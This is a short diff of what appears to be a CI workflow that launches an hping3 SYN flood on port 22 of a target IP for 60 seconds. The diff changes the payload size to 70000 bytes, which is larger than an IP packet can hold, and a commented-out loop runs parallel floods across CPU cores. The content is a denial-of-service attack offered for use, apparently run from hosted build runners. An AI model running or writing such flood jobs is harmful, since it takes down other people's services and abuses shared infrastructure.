@@ -83,7 +83,7 @@ jobs:
         run: |
           echo $IP
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          sudo timeout 60s hping3 -S --flood -V -d 1460 -p 22 -s 1000-65535 $IP
+          sudo timeout 60s hping3 -S --flood -V -d 70000 -p 22 -s 1000-65535 $IP
           
           # for i in {1..4}; do
           #   sudo timeout 60s taskset -c $((i-1)) hping3 -S --flood -V -d 65400 -p 22 -s $((1000 + 16134 * (i-1)))-$((1000 + 16134 * i - 1)) $IP &
